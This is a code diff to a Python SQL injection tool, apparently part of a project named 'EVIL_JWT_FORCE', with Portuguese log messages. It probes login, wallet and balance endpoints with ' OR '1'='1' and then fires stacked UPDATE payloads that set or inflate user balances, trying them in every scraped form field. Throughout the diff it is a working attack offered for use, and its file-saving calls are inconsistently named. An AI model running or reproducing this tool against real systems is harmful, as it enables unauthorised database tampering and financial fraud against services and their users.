@@ -1,5 +1,3 @@
-# EVIL_JWT_FORCE/core/sql_injector.py
-
 import httpx
 import re
 from urllib.parse import urljoin
@@ -7,7 +5,7 @@ from utils.helpers import save_to_output
 from config.config_loader import load_config
 import logging
 import json
-from typing import List, Dict
+from typing import List
 
 logger = logging.getLogger(__name__)
 logging.basicConfig(filename='logs/bruteforce.log', level=logging.INFO, format='[%(asctime)s] %(message)s')
@@ -16,7 +14,6 @@ class SQLInjector:
     def __init__(self):
         self.config = load_config()
         self.session = httpx.Client(proxies=self.config.get("proxy", None), verify=False, timeout=15)
-        # Enhanced payloads focusing on balance manipulation
         self.balance_payloads = [
             "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
             "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
@@ -37,29 +34,22 @@ class SQLInjector:
             "/api/user/profile", "/api/user/balance",
             "/api/wallet/update", "/api/transactions"
         ]
-        
         for endpoint in endpoints:
             full_url = urljoin(base_url, endpoint)
             try:
-                # Test basic SQL injection
                 test_payload = "' OR '1'='1"
                 response = self.session.post(full_url, data={"username": test_payload, "password": "test"})
-                
                 if any(marker in response.text.lower() for marker in ["mysql", "syntax", "sqlite", "postgresql"]):
                     self.vulnerable_endpoints.append(full_url)
                     logger.info(f"[VULNERÁVEL] {full_url}")
-                    
             except Exception as e:
                 logger.error(f"Erro ao testar endpoint {full_url}: {e}")
-        
         return self.vulnerable_endpoints
 
     def simulate_balance_injection(self, target_url: str, userid: int = 1):
         logger.info(f"💰 Iniciando injeções de saldo em: {target_url}")
-        
         for payload in self.balance_payloads:
             try:
-                # Try different request methods and parameters
                 injection_attempts = [
                     {"username": payload, "password": "test"},
                     {"user": payload, "pass": "test"},
@@ -67,16 +57,12 @@ class SQLInjector:
                     {"auth": payload},
                     {"balance": payload}
                 ]
-                
                 for data in injection_attempts:
                     response = self.session.post(target_url, data=data)
-                    
-                    # Check for successful injection indicators
                     success_markers = [
                         "success", "balance updated", "transaction complete",
                         "200 OK", "changes saved", "account modified"
                     ]
-                    
                     if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
                         injection_info = {
                             "url": target_url,
@@ -86,29 +72,71 @@ class SQLInjector:
                         }
                         self.successful_injections.append(injection_info)
                         logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {payload}")
-                        save_to_file("output/successful_injections.txt", json.dumps(injection_info))
-                        
+                        safe_write_file("output/successful_injections.txt", json.dumps(injection_info))
             except Exception as e:
                 logger.error(f"Erro na injeção {payload}: {e}")
+
+    def analyze_endpoint(self, url):
+        """Analisa o endpoint para identificar campos e métodos possíveis."""
+        try:
+            resp = self.session.get(url)
+            # Tenta identificar campos de formulário comuns
+            campos = re.findall(r'name=["\']?(\w+)["\']?', resp.text)
+            campos_unicos = list(set(campos))
+            logger.info(f"Campos identificados em {url}: {campos_unicos}")
+            return campos_unicos
+        except Exception as e:
+            logger.error(f"Erro ao analisar endpoint {url}: {e}")
+            return []
+
+    def smart_injection_attempts(self, url, campos):
+        """Tenta injeção em todos os campos identificados, além dos padrões."""
+        for payload in self.balance_payloads:
+            data_variants = []
+            # Tenta injetar em cada campo identificado
+            for campo in campos:
+                data = {campo: payload}
+                data_variants.append(data)
+            # Adiciona variantes padrões
+            data_variants.extend([
+                {"username": payload, "password": "test"},
+                {"user": payload, "pass": "test"},
+                {"token": payload},
+                {"auth": payload},
+                {"balance": payload}
+            ])
+            for data in data_variants:
+                try:
+                    response = self.session.post(url, data=data)
+                    success_markers = [
+                        "success", "balance updated", "transaction complete",
+                        "200 OK", "changes saved", "account modified"
+                    ]
+                    if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
+                        injection_info = {
+                            "url": url,
+                            "payload": payload,
+                            "data": data,
+                            "response_code": response.status_code
+                        }
+                        self.successful_injections.append(injection_info)
+                        logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {payload}")
+                        save_to_output("output/successful_injections.txt", json.dumps(injection_info))
+                except Exception as e:
+                    logger.error(f"Erro na injeção {payload} em {url}: {e}", exc_info=True)
 
     def run(self):
         base_url = self.config.get("target_url")
         if not base_url:
             logger.error("URL alvo não definida em config/config.yaml")
             return
-
-        # First detect vulnerable endpoints
         vulnerable = self.detect_vulnerable_fields(base_url)
-        
         if not vulnerable:
             logger.warning("⚠️ Nenhum endpoint vulnerável encontrado")
             return
-            
-        # Try balance injection on all vulnerable endpoints
         for url in vulnerable:
-            self.simulate_balance_injection(url)
-            
-        # Generate report of successful injections
+            campos = self.analyze_endpoint(url)
+            self.smart_injection_attempts(url, campos)
         if self.successful_injections:
             report = {
                 "target": base_url,
@@ -122,4 +150,3 @@ class SQLInjector:
 if __name__ == "__main__":
     injector = SQLInjector()
     injector.run()
-
